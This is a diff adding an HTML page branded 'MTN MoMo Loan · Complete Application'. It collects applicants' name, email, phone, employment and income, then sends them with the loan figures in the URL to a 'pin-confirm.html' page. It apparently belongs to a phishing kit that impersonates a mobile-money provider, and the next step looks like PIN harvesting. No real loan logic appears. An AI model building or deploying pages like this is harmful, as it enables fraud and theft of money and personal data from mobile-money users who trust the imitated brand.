@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>MTN MoMo Loan · Complete Application</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
+            font-family: 'Inter', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .app-container {
+            max-width: 520px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .loan-summary-bar {
+            background: rgba(17, 24, 39, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            border: 1px solid rgba(255, 204, 0, 0.15);
+        }
+
+        .summary-item {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .summary-label {
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: #7e8aa2;
+            text-transform: uppercase;
+        }
+
+        .summary-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #FFCC00;
+            margin-top: 2px;
+        }
+
+        .apply-card {
+            background: rgba(17, 24, 39, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            border: 1px solid rgba(255, 204, 0, 0.15);
+            padding: 28px 24px 32px;
+        }
+
+        .section-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff, #FFCC00);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+
+        .section-sub {
+            font-size: 0.8rem;
+            color: #7e8aa2;
+            margin-bottom: 28px;
+            border-left: 3px solid #FFCC00;
+            padding-left: 12px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+        }
+
+        .required:after {
+            content: "*";
+            color: #f43f5e;
+            margin-left: 4px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 0.95rem;
+            border: 1.5px solid rgba(31, 42, 62, 1);
+            border-radius: 20px;
+            background: #0f1724;
+            color: #e2e8f0;
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #FFCC00;
+        }
+
+        .row-2cols {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+        }
+
+        .radio-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 0;
+            cursor: pointer;
+        }
+
+        .radio-group input {
+            width: 18px;
+            height: 18px;
+            accent-color: #FFCC00;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #FFCC00, #F5A623);
+            border: none;
+            padding: 16px 20px;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #0b1120;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .submit-btn:active {
+            transform: scale(0.97);
+        }
+
+        .error-message {
+            background: rgba(244, 63, 94, 0.15);
+            color: #f43f5e;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            margin-top: 16px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .phone-hint {
+            font-size: 0.65rem;
+            color: #5b6a8a;
+            margin-top: 5px;
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .apply-card {
+                padding: 22px 18px 26px;
+            }
+            .row-2cols {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="app-container">
+    <div class="loan-summary-bar">
+        <div class="summary-item">
+            <span class="summary-label">Loan Amount</span>
+            <span class="summary-value" id="summaryAmount">₵0</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Term</span>
+            <span class="summary-value" id="summaryTerm">0 months</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Monthly</span>
+            <span class="summary-value" id="summaryMonthly">₵0</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Interest</span>
+            <span class="summary-value" id="summaryRate">5%</span>
+        </div>
+    </div>
+
+    <div class="apply-card">
+        <div class="section-title">📱 Complete your application</div>
+        <div class="section-sub">Fill in your personal details below</div>
+
+        <form id="applicationForm">
+            <div class="form-group">
+                <label class="required">Full name</label>
+                <input type="text" id="fullName" placeholder="Kwame Mensah" required>
+            </div>
+
+            <div class="row-2cols">
+                <div class="form-group">
+                    <label class="required">Email address</label>
+                    <input type="email" id="email" placeholder="kwame@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label class="required">Phone number</label>
+                    <input type="tel" id="phone" placeholder="+233 54 123 4567" required>
+                    <span class="phone-hint">📱 Enter your phone number with country code (e.g., +233, +254, +263, +234)</span>
+                </div>
+            </div>
+
+            <div class="row-2cols">
+                <div class="form-group">
+                    <label class="required">Employment status</label>
+                    <select id="employment" required>
+                        <option value="">Select</option>
+                        <option>Employed full-time</option>
+                        <option>Employed part-time</option>
+                        <option>Self-employed</option>
+                        <option>Business owner</option>
+                        <option>Retired</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="required">Monthly income (₵)</label>
+                    <input type="number" id="monthlyIncome" placeholder="e.g., 3500" required>
+                </div>
+            </div>
+
+            <div class="radio-group">
+                <label>
+                    <input type="checkbox" id="consent" required> I confirm that the information provided is accurate.
+                </label>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Continue →</button>
+            <div class="error-message" id="errorMessage"></div>
+        </form>
+    </div>
+</div>
+
+<script>
+    // Function to validate phone number (must start with + and country code)
+    function isValidPhone(phone) {
+        // Remove spaces, dashes, and parentheses
+        const cleaned = phone.replace(/[\s\-\(\)]/g, '');
+        // Check if it starts with + and has at least 10 digits total (minimum +1234567890)
+        const regex = /^\+\d{10,14}$/;
+        return regex.test(cleaned);
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount') || '0';
+    const term = urlParams.get('term') || '0';
+    const rate = urlParams.get('rate') || '5';
+    const monthly = urlParams.get('monthly') || '0';
+
+    document.getElementById('summaryAmount').innerText = `₵${parseInt(amount).toLocaleString()}`;
+    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
+    document.getElementById('summaryMonthly').innerText = `₵${parseFloat(monthly).toFixed(2)}`;
+    document.getElementById('summaryRate').innerText = `${rate}%`;
+
+    document.getElementById('applicationForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const fullName = document.getElementById('fullName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const employment = document.getElementById('employment').value;
+        const monthlyIncome = document.getElementById('monthlyIncome').value;
+        const consent = document.getElementById('consent').checked;
+        const errorMsgDiv = document.getElementById('errorMessage');
+        
+        if (!fullName || !email || !phone || !employment || !monthlyIncome || !consent) {
+            errorMsgDiv.textContent = 'Please fill all required fields';
+            errorMsgDiv.classList.add('show');
+            setTimeout(() => errorMsgDiv.classList.remove('show'), 3000);
+            return;
+        }
+        
+        // Validate phone number (must start with + and country code)
+        if (!isValidPhone(phone)) {
+            errorMsgDiv.textContent = '❌ Please enter a valid phone number with country code (e.g., +233 54 123 4567)';
+            errorMsgDiv.classList.add('show');
+            setTimeout(() => errorMsgDiv.classList.remove('show'), 3000);
+            return;
+        }
+        
+        errorMsgDiv.classList.remove('show');
+        
+        const params = new URLSearchParams();
+        params.set('amount', amount);
+        params.set('term', term);
+        params.set('rate', rate);
+        params.set('monthly', monthly);
+        params.set('name', fullName);
+        params.set('email', email);
+        params.set('phone', phone);
+        
+        window.location.href = `pin-confirm.html?${params.toString()}`;
+    });
+</script>
+</body>
+</html>
